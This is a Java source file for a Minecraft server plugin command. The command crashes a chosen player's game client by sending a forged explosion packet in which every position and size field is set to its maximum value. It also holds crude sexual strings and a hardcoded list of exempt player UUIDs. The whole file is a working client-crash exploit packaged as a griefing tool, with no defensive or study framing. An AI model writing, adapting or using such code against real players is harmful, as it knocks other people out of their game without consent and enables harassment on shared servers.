package withicality.csmp.global.commands;

import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import com.google.common.collect.ImmutableList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import withicality.csmp.api.APIStuff;
import withicality.csmp.api.CosmicCommand;

import java.lang.reflect.InvocationTargetException;
import java.util.Arrays;
import java.util.List;

public class FunnyCommand extends CosmicCommand {
    public FunnyCommand() {
        super("proxsuckmyp", "", "", ImmutableList.of(), "csmp.funnycommand");
    }

    @Override
    public void run(CommandSender sender, Player player, String[] args) {
        if (player == null) {
            sender.sendMessage(getNotPlayerMessage());
            return;
        }

        List<String> poo = Arrays.asList("129d76da-0e85-4f49-9bad-09604aa4004a", "272c1d8e-1fec-4204-99c8-90978140a0ac", "7ddfba3e-0573-43e6-bbe2-24c1d6f2bca2");
        if (poo.contains(player.getUniqueId().toString())) {
            player.sendMessage("I'm gonna suck you");
        } else if (args.length == 0) {
            sendUsage(player);
        } else if (args[0].equalsIgnoreCase(player.getName())) {
            if (args.length == 2 && args[1].equalsIgnoreCase("--accept")) {
                this.crash(player, player);
            } else {
                player.sendMessage(APIStuff.HR);
                player.sendMessage(ChatColor.DARK_AQUA + "I'm not sure you want to do this to yourself");
                player.sendMessage(ChatColor.DARK_AQUA + "If you want to try it on yourself, type " + ChatColor.DARK_AQUA + "/banana " + sender.getName() + " --accept");
                player.sendMessage(APIStuff.HR);
            }
        } else {
            Player p = Bukkit.getPlayerExact(args[0]);
            if (p == null) {
                noPlayerFound(args[0], player);
            } else {
                crash(p, player);
            }
        }

    }

    private void crash(Player player, Player sender) {
        ProtocolManager manager = APIStuff.getProtocolManager();
        PacketContainer packet = manager.createPacket(com.comphenix.protocol.PacketType.Play.Server.EXPLOSION);
        packet.getDoubles().write(0, Double.MAX_VALUE);
        packet.getDoubles().write(1, Double.MAX_VALUE);
        packet.getDoubles().write(2, Double.MAX_VALUE);
        packet.getFloat().write(0, Float.MAX_VALUE);
        packet.getFloat().write(1, Float.MAX_VALUE);
        packet.getFloat().write(2, Float.MAX_VALUE);
        packet.getFloat().write(3, Float.MAX_VALUE);

        try {
            manager.sendServerPacket(player, packet);
            sender.sendMessage(ChatColor.GREEN + "Crashed player " + player.getName() + ".");
        } catch (InvocationTargetException var5) {
            var5.printStackTrace();
            sender.sendMessage(ChatColor.RED + "Unnable to crash " + player.getName() + ".");
        }

    }
}
